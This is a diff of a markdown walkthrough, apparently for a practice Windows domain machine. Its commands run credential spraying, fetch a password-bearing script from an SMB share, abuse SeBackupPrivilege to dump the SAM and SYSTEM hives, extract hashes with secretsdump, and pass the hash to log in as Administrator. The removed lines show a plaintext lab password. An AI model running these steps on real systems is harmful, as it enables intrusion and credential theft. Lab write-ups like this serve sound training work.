@@ -94,11 +94,57 @@ emily.oscars
 ```
 
 ```bash
-crackmapexec smb $IP -u 'users.txt' -p 'Cicada$M6Corpb*@Lp#nZp!8'
+crackmapexec smb $IP -u 'users.txt' -p 'C-----------'
 ```
 
 ### nxc
 
 ```bash
-nxc ldap $IP -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -M get-desc-users
+nxc ldap $IP -u 'michael.wrightson' -p 'C-------------' -M get-desc-users
+
+# gives david.orelious password
+
+smbclient -u 'david.orelious' \\\\$IP\\Dev
+
+get Backup_script.ps1
+
+#script gives emily.oscars password
 ```
+
+## Evil-winrm
+
+```bash
+evil-winrm -u 'emily.oscars' -p '' -i $IP
+
+whoami /priv
+```
+
+## SEbackupPrivilege
+
+```pwsh
+mkdir C:\Temp
+
+reg save hklm\sam C:\temp\sam.hive
+
+reg save hklm\system C:\temp\system.hive
+
+download C:\temp\sam.hive
+
+download C:\temp\system.hive
+```
+
+### impacket-secretsdump
+
+```bash
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+```
+
+## Privesc-admin
+
+```bash
+evil-winrm -u "Administrator" -H"<NT-HASH>" -i $IP
+```
+
+### references
+
+[Windows-Local-priv-esc-cookbook](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md)
